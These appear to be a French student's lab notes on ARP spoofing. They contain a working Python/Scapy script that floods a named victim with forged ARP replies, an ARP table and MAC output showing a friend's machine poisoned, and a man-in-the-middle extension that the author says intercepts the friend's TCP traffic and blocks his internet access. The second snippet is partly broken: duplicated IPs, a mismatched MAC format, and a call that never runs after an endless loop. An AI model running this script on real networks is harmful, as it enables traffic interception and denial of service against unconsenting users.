☀️ Capturez un échange DHCP complet

```
from scapy.all import ARP, Ether, sendp, conf, getmacbyip

def arp_poison(victim_ip, victim_mac, router_ip):
    # Get your own MAC address (attacker's MAC)
    attacker_mac = "14:5A:FC:7F:13:93"
    
    # Create an Ethernet frame with the destination MAC as the victim's MAC
    ethernet = Ether(dst=victim_mac)
    
    # Create an ARP response saying that your MAC address (attacker_mac) is the router (router_ip)
    arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=attacker_mac, op='is-at')
    
    # Combine the Ethernet frame and the ARP response
    packet = ethernet / arp_response

    # Send the ARP response packet in a loop to keep poisoning the victim's ARP cache
    while True:
        sendp(packet, verbose=0)


target_ip = "192.168.11.69"  # IP of the victim
target_mac = "90:e8:68:15:ac:43"  # MAC of the victim
spoof_ip = "192.168.11.46"  # IP you want to spoof (usually the gateway)

La table ARP de mon pote :
192.168.11.46 dev wlo1 lladdr 14:5a:fc:7f:13:93 REACHABLE

Preuve que c'est mon MAC :
Carte réseau sans fil Wi-Fi :

   Suffixe DNS propre à la connexion. . . :
   Description. . . . . . . . . . . . . . : MediaTek Wi-Fi 6 MT7921 Wireless LAN Card
   Adresse physique . . . . . . . . . . . : 14-5A-FC-7F-13-93
```

⭐ Mettre en place un MITM

```
On rajoute ça à la fin : 

target_ip2 = "192.168.11.46"  # IP of the victim
target_mac2 = "96-24-c9-47-ee-dc"  # MAC of the victim
spoof_ip2 = "192.168.11.46"  # IP you want to spoof (usually the gateway)

arp_poison(target_ip, target_mac, spoof_ip)
arp_poison(target_ip2, target_mac2, spoof_ip2)

Je reçois bien ses requêtes TCP et il ne peut pas se connecter à des sites internet
```
